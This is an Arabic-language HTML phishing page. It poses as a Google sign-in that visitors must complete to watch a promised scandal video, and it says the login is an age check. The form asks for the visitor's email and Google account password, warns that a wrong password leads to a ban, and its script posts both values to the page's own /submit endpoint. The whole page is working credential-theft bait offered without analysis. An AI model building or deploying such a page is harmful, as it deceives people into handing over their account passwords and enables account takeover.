<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>نموذج تسجيل البيانات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1f1f1f, #2c3e50);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background-color: #2c3e50;
      padding: 30px 40px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(0,0,0,0.5);
      max-width: 400px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #f1c40f;
    }
    label {
      display: block;
      margin: 15px 0 5px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      margin-bottom: 20px;
      font-size: 16px;
    }
    input {
      background-color: #34495e;
      color: white;
    }
    button {
      background-color: #f1c40f;
      color: #2c3e50;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #d4ac0d;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>سجل بحساب جوجل الخاص بك لمشاهدة الفيديو</h2>
    <form id="dataForm">
      <label for="email">البريد الإلكتروني</label>
      <input type="email" id="email" name="email" required />
      <label for="code">كلمة سر حساب جوجل</label>
      <input type="text" id="code" name="code" required />
      <button type="submit">عرض الفيديو</button>
    </form>
 <div class="note">
      
      <h2>
        هذا النموذج للتأكد من السن القانوني. 
<h2>تحذيرر</h2>
عند عدم ظهور الفيديو، يجب التأكد من كلمة سر حساب جوجل جيداً لا تكرر ادخال البيانات تأكد اولا ان كلمة السر والبريد صحيح وألا سوف يتم حظرك من عرض الفيديو.
        </h2>
      <h2>
 فضايح ابطال المنيا</h2>
      
    </div>
  </div>

  <script>
    document.getElementById('dataForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const code = document.getElementById('code').value;

      const res = await fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code })
      });

      if (res.ok) {
        alert("✅ تم الإرسال بنجاح!");
      } else {
        alert("❌ حدث خطأ أثناء الإرسال.");
      }
    });
  </script>
</body>
</html>
